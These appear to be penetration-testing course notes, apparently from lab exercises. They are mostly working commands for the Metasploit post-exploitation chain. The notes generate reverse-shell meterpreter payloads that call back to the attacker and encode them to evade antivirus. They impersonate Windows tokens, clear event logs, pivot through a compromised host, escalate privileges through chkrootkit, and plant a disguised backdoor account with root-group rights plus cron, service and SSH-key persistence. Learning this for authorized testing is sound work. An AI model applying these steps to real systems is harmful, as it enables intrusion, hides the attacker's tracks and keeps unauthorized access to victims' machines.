### Generating Payloads using Msfvenom:

**Client Side Attacks**:
- It is a type of attack that will coerce the victim to execute a malicious payload and will let the attacker gain access.
- Involves Social Engineering.
- We may have to encode payloads to bypass AV.

**Msfvenom**:
- It is a CLI tool, that is used to generate and encode msf payloads.
- Combination of the old tools, msfpayload and msfencode.
- We can use this to generate a meterpreter payload.

Staged payload - windows/64/meterpreter/reverse_tcp
Non-staged payload - windows/64/meterpreter_reverse_tcp

`msfvenom --list formats` --> list all the formats we can export the payload as.

**Windows payload**:
`msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<our-ip> LPORT=1234 -f exe > ~/Desktop/payloadx64.exe` --> must specify the extension at the end.
- a --> architecture
- p --> payload
- f --> file format

**Linux payload**:
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<our-ip> LPORT=1234 -f elf > ~/Desktop/payloadx86`
For 64 bit linux payload, don't need to use -a flag , just change other things to 64.

Before the attacker executing this exe , we must set up our handler.

**Serving the Payload in web server**:
`sudo python -m SipleHTTPServer 80` --> to set up a http server.

**Multi Handler**:
`msf> use multi/handler`

`msf (handler)> set payload windows/meterpreter/reverse_tcp`
set lhost, lport based on the msfvenom payload.
It will start reverse tcp handler.

Now when the victim make request to our python server and download the payload file and execute it, we will get a meterpreter session.

Most of the times AV blocks it. We can do encoding to bypass AV.

### Encoding Payloads with msfvenom:
- While we exploit the services running in the port, our payload will get executed in memory and it never touches disk.
- But in client side attacks, it will run in the disk, so AV will detect it.
- We can evade Signature based AV by encoding our payloads.
- Signature based AV will have the hash of each malware type. So if we changed one byte of our payload, AV can't detect.
- Thats why we go with the encoding.

**Shellcode**:
- It is a piece of code , that give command shells access of a target system to the attacker.
- It is the payloads itself.

`msfvenom --list encoders` --> list all encoders

**Generate a Encoded Payload**:
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<our-ip> LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/Desktop/encodex86.exe`
- e --> encoder
- It will do only one iteration at default, we can increment it to bypass AV efficiently.

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<our-ip> LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/encodex86.exe`
- i --> iterations

### Token Impersonation with Incognito:
**Windows Access Token**:
- Access token is generated by winlogon.exe process , everytime the user authenticate successfully with creds.
- Access token includes the identity and privileges of the user account (associated with thread/process).
- The token is attached to userinit.exe . So all child processes started by the user will take a copy of the token and will run under this privilege.
- Windows access tokens are categorized based on different security levels. They are .
	- Impersonate level - created as a result of not interactive login. (impersonate tokens in local).
	- Delegate level - created through interactive login, eg: accessing using RDP. (impersonate tokens in remote).
- Delegate poses are great threat.

windows privilege image

**Incognito** is a meterpreter module, that is used to impersonate user tokens after exploitation.
We can use this to list all tokens , that we can impersonate.

Impersonation token is created by threads whereas Delegation tokens are created when user login interactively.

Try to get access to system using rejetto hfs exploit. You can try to exploit any service and get access.

`meterpreter> pgrep explorer`
Now migrate to explorer process.
We are migrating to explorer everytime bcuz its a stable process and to avoid suspicion.
Some the access maybe denied due to less privilege.

`meterpreter> getprivs`
If it has **SeImpersonatePrivilege**, then we can do token impersonation.

`meterpreter> load incognito` --> load the incognito

`meterpreter> list_tokens -u` --> to list all tokens that we can impersonate.
Here in our case, we have delegation tokens i.e) nt authority and administrator user token.

`meterpreter> impersonate_token "<token-name>"`

`meterpreter> impersonate_token "ATTACKDEFENSE\Administrator"`
You will impersonated the user successfully.
Do get getuid, getprivs to confirm.

We can also impersonate NT authority system.

**Sometimes getprivs won't work. At that time migrate the process to explorer and then try, it will work.**

This exploit completely depends on what users are currently running and have admin privileges. And if you find a access token for this user that you can impersonate, we can obtain privileges associated with the user.

There will be some cases where the target don't have any delegation or impersonate token, at that time use potato attack.

Its because sometimes we may got access to system by exploiting a service. If service is patched, we can't get access to target. So once we got access, we can capture the password hash. Later we can use it any time to authenticate with the target.

### Clearing Windows Event Logs:

**Windows Event Logs**:
- Windows stores all the events performed on the system.
- Types:
	1. Application Logs : stores program startups, crashes
	2. System logs : stores system events like startups and reboot
	3. Security logs : stores security events like password changes, authentication failures.
- Event logs can be accessed via the Event Viewer on Windows.

**Steps**:
- Gain initial access to the system.
- `meterpreter> clearev` --> this will clear all the logs

### Pivoting with Meterpreter:
- It is a post exploitation technique.
- Use the compromised host to attack other system on the target's private network.
- Meterpreter allows us to add a network route to the internal network's subnet and consequently scan the other systems.

**Steps**:
- Gain initial access to the target machine.
- `meterpreter> ifconfig` --> now identify the ip in the another interface.
- `meterpreter> run autoroute -s <new-ip>/<cidr> --> add new route.
- Based on the netmask shown in `ifconfig`, set the cidr notation.
- Which means all the traffic from our system to the target 3, will be sent through the target 2.
- You can set the current session name to victim-1 , just for identification purpose.

**Post**:
- `portscan/tcp` --> perform port scan on target 3. But we won't get service banner or anything.
- `meterpreter> portfwd add -l 1234 -p 80 -r <target3-ip>` 
- In target 3, port 80 is open. 
- Here we are performing port forwarding. Means whatever request is sent to your localhost 1234 will be forwarded to target 3 : port 80 via the target 2 (route already created by you).
- Now perform db_nmap scan.
- `msf> db_nmap -sS -sV -p 1234 localhost` --> scan the target 3 and gives service banner too.
- Now we found out that target 3 is running, badblue server.
- choose badblue_passthru module.
- set payload as windows bind_tcp. As we don't have direct access to machine 3, we can only use bind shell.
- set lport, rhost and exploit it.
- New meterpreter session is created for target 3.

## Linux Privilege Escalation:

#### Exploiting a Vulnerable Program:
- Exploiting a program or service to gain privileged access.

Use ssh_login msf module and set username and pass, to get a session.
Upgrade the current shell to meterpreter.

**Steps**:
- `ps aux` --> check whether the root is running any different binary. 
- Read that code. `cat /bin/check-down`
- Here it runs chkrootkit every 60 seconds.
- chkroot is a tool that will detects the rootkits in linux system.
- version <0.5.0 is vulnerable to priv esc. So we can try to exploit that.
- `chkrootkit -v` --> version of chkrootkit
- Likewise we have to check for any binary.
- `unix/local/chkrootkit` --> do rpiv esc
- set chkrootkit `/bin/chkrootkit` --> based on its location, you mention it.
- also set the session,lhost and run it.

How this exploit works:
- It create a cron job, that will execute the chkrootkit.
- GIves us a command shell with root privileges.

### Maintaining Persistence in Linux:
- We can use `unix/local/chkrootkit` module , to perform local privilege escalation.
- check the chkrootkit version in shell. It has to be <=0.5.0.
- set session and chkrootkit as /bin/chkrootkit
- run it and you will get command shell
- upgrade to meterpreter

**Creating a backdoor**:
`useradd -m ftp -s /bin/bash` --> create a user named ftp. It will look like ftp account for the victim so he leave it.

`passwd ftp pass` --> set password for ftp account.

`groups root` --> check the root user's group.

`usermod -aG root ftp` --> adding ftp account to the root user's group.

**Persistence using cronjobs:
- `linux/local/cron_persistence` --> this module will create cron jobs to give persistence.
- set session,lport, lhost and exploit.

**Persistence using service**:
- `linux/local/service_persistence` --> this module gives persistence through service.
- set lhost, lport and session
- change target one by one and test it.


#### SSH key persistence:
- `sshkey_persistence` --> this module will create a public and private key.
- It will add the public key to the home dir of all user accounts.
- We can use the private key to auth with any connects .
